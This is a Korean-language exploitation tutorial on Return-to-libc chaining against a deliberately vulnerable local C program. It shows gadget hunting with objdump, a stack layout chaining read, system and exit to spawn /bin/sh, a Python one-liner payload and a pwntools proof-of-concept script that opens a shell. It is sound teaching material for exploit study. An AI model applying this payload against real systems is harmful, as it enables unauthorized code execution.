# Return to Libc Chaining

---

### 0x01 What is it?

RTL 공격에서 RET 주소를 변조하여 하나의 공유 라이브러리 함수를 호출 했다면, RTL Chaining 공격 기법은 RTL 공격 기법을 응용하여 여러개의 공유 라이브러리 함수를 호출 할 수 있다.

---

### 0x02 Prior knowledge

이 공격 기법을 처음 보고 이해하기는 힘들 수도 있다. (필자가 그랬다...ㅇㅇ)

이 글을 이해하기 위해서는 호출된 함수가 인자를 가져오는 방법과 Return to libc 공격 기법을 이미 숙지 했다라는 기준으로 설명을 하겠다. (모른다면 링크 클릭) [Return to Libc](https://github.com/Lactea98/Pwnable/tree/master/02%20Return%20to%20Libc)

아래와 같은 코드가 있다고 가정하자. read 함수에서 buf 변수 크기 이상으로 값을 받고 있다. 여기서 bof가 발생하는데, call_me1() 함수를 호출하기 위해서는 RET에 call_me1() 함수의 주소로 overwrite 하면된다.

```c
#include <stdio.h>

void call_me1(int a){
        printf("Parameter value: %d",a);
}

void call_me2(int b){
        printf("Parameter value: %d",b);
}

int main(){
        char buf[50];
        read(0,buf,100);
        printf("%s",buf);
}
```

위 코드를 아래와 같은 옵션으로 gcc로 컴파일을 하고 gdb를 통해 call_me1의 주소를 알아보자.

```
gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -fno-pic -no-pie -o code code.c
```

call_me1의 주소는 0x08048456 라는 것을 알아냈고, buf 변수에서 RET 까지의 거리는 54bytes이므로 dummy code는 54bytes, RET 주소에 call_me1의 주소인 4bytes를 집어 넣어준다.

```
gdb-peda$ disas call_me1
Dump of assembler code for function call_me1:
   0x08048456 <+0>:     push   ebp
   0x08048457 <+1>:     mov    ebp,esp
   0x08048459 <+3>:     push   DWORD PTR [ebp+0x8]
   0x0804845c <+6>:     push   0x8048530
   0x08048461 <+11>:    call   0x8048310 <printf@plt>
   0x08048466 <+16>:    add    esp,0x8
   0x08048469 <+19>:    nop
   0x0804846a <+20>:    leave  
   0x0804846b <+21>:    ret    
End of assembler dump.
```

추가적으로 call_me2() 함수를 호출하려면 call_me1() 함수 주소 뒤에 call_me2() 함수의 주소를 적어주면 된다.

2개의 함수를 호출 했는데, 인자 값은 어떻게 넘겨 줄 수 있을까?

위 어셈블리 코드를 보면 call_me1+3에서 ebp+0x8은 인자 값을 가져와 스택에 PUSH 하는 명령어 이다. 즉, 함수의 매개변수 값을 주기 위해서는 아래와 같은 스택 구조로 overwrite 하면 된다.

```
low addr

=======
AAAAAA...
=======
AAAAAA...
=======
&call_me1()
=======
dummy code
=======
call_me1의 인자 값
=======
&call_me2()
=======
dummy code
=======
call_me2의 인자 값
=======

high addr


```

위 스택을 RET에 overwrite 하면 문제가 생긴다. call_me1 함수는 매개변수의 값이 잘 전달되어 실행이 잘 될 것이지만, call_me1 호출 후 dummy code 값 때문에 오류가 나서 call_me2 함수가 실행이 되지 않는다는 것이다.

이럴때 Gadget을 사용한다. RTL에서 Chaining을 하기 위한 아주 중요한 녀석이다.

Gadget은 필요한 명령어를 찾아서 그 주소를 넣게되면 사용할 수 있는 자그만한 기계 부품이라고 생각하면 된다.

---

위 스택을 정상적으로 실행하기 위한 Gadget을 생각해보자.

첫번째 dummy code 뒤에는 call_me1의 인자 값과 call_me2 함수의 주소가 있다. 이를 잘 처리하기 위해서는, 우선 call_me1의 인자 값을 POP하고 RET 명령으로 call_me2로 이동하면 된다.

즉, 우리가 찾아야 할 Gadget은 POP -> RET 를 수행하는 주소를 찾으면 된다. 이 주소를 찾기 위해서는 아래 명령어를 통해 찾는다. 

```
$ objdump -d [컴파일 된 파일 명] 
...
...
8048503:       75 e3                   jne    80484e8 <__libc_csu_init+0x38>
8048505:       83 c4 0c                add    $0xc,%esp
8048508:       5b                      pop    %ebx
8048509:       5e                      pop    %esi
804850a:       5f                      pop    %edi
804850b:       5d                      pop    %ebp
804850c:       c3                      ret    
804850d:       8d 76 00                lea    0x0(%esi),%esi
...
...
```

위 어셈블리 코드를 보면 6~10번째 줄에 우리가 찾던 Gadget들이 있다. 이것들 중 우리는 pop ret만 필요하므로 0x804850a 만 챙긴다.

그러면 다음과 같은 payload가 만들어 진다.

```
[dummy code] + [&call_me1] + [0x804850a] + [call_me1 인자 값] + [&call_me2] + [0x804850a] + [call_me2 인자 값]
```

이런식으로 RTL Chaining 공격 기법을 실습하기 전 간단한 공격 원리를 설명했다. 잘 이해가 가질 않는다면 아래 블로그 주소를 보는 것을 추천한다. https://kblab.tistory.com/222

---

### 0x03 Return To Libc Chaining

본격적으로 공격 실습을 해보겠다. 아래 코드는 실습을 위한 코드이며, 이를 gcc에 아래와 같은 옵션을 넣어 컴파일을 해준다.

```c
/* File name: vuln.c */

#include <stdio.h>

int main(){
        char buf[50];
        read(0,buf,100);
        printf("%s\n",buf);
}
```

```
$ gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -fno-pic -no-pie -o vuln vuln.c
```

RTL 공격처럼 공유 라이브러리 함수 주소를 알아내기 위해 main함수에 breakpoint를 걸고 아래와 같은 명령어로 공유 라이브러리 함수 주소를 알아낸다.

```
gdb-peda$ b *main
gdb-peda$ r

gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e21d10 <system>
gdb-peda$ p read
$2 = {<text variable, no debug info>} 0xf7eca620 <read>
gdb-peda$ p exit
$3 = {<text variable, no debug info>} 0xf7e14f70 <exit>
```

함수의 호출은 read -> system -> exit 순이다. read 함수에 /bin/sh 문자열을 입력하고, 이 문자열을 system 함수에 값을 넘겨 shell을 실행하는 것이다. 그러기 위해서는 /bin/sh 문자열을 저장할 곳과 그 저장된 주소가 변하지 않는 곳을 찾아야 한다.

알맞은 메모리 영역은 data, bss, dynamic 이라는 곳이다. 이 중 bss 영역의 주소를 아래와 같은 명령어로 찾는다. bss 주소는 0x0804a020 이다.

```
$readelf -S [컴파일 된 파일 명] | grep "bss"
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
```

그 다음 Gadget 주소를 찾아야 한다. 위에서 했던 방식대로 pop ret, 주소와 pop pop pop ret 주소를 찾아보자.

```
$ objdump -d [컴파일 된 파일명]
...
...
80484d8:       5b                      pop    %ebx
80484d9:       5e                      pop    %esi
80484da:       5f                      pop    %edi
80484db:       5d                      pop    %ebp
80484dc:       c3                      ret    
...
```

필요한 주소는 0x80484d9와 0x80484db 이다.

최종적인 스택의 구조는 다음과 같다.

```
[&read()] + [pop pop pop ret] + [0x0] + [&bss] + [0x8] + [&system()] + [pop ret] + [&bss] + [&exit()] 
```

위 payload 주소를 참고하여 아래와 같이 바이너리를 실행해보자.

```
$ (python -c 'print "A"*54+"\x20\xa6\xec\xf7"+"\xd9\x84\x04\x08"+"\x00\x00\x00\x00"+"\x20\xa0\x04\x08"+"\x08\x00\x00\x00"+"\x10\x1d\xe2\xf7"+"\xdb\x84\x04\x08"+"\x20\xa0\x04\x08"+"\x70\x4f\xe1\xf7"'; cat ) | ./vuln                  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ل
/bin/sh

ls
code  code.c    vuln  vuln.c

```

최종적으로 shell을 획득한 것을 볼 수 있다.


---

### 0x03 Payload using pwntools

python의 pwntools를 이용해서 스크립트를 짜보면 아래와 같다.

```python 
from pwn import *
import time


p = process('./vuln')

read = 0xf7eca620
system = 0xf7e21d10
exit = 0xf7e14f70
bss = 0x0804a020

pop3ret = 0x080484d9
popret = 0x080484db

payload = "A"*54
payload += p32(read)
payload += p32(pop3ret)
payload += p32(0x0)
payload += p32(bss)
payload += p32(0x8)
payload += p32(system)
payload += p32(popret)
payload += p32(bss)
payload += p32(exit)

p.send(payload)
sleep(0.5)

p.send("/bin/sh\x00")
p.interactive()
```

```
$ python poc.py 
[+] Starting local process './vuln': pid 18773
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \xa6x84\x0
$ ls
code    poc.py  vuln.c
code.c    vuln
$  
```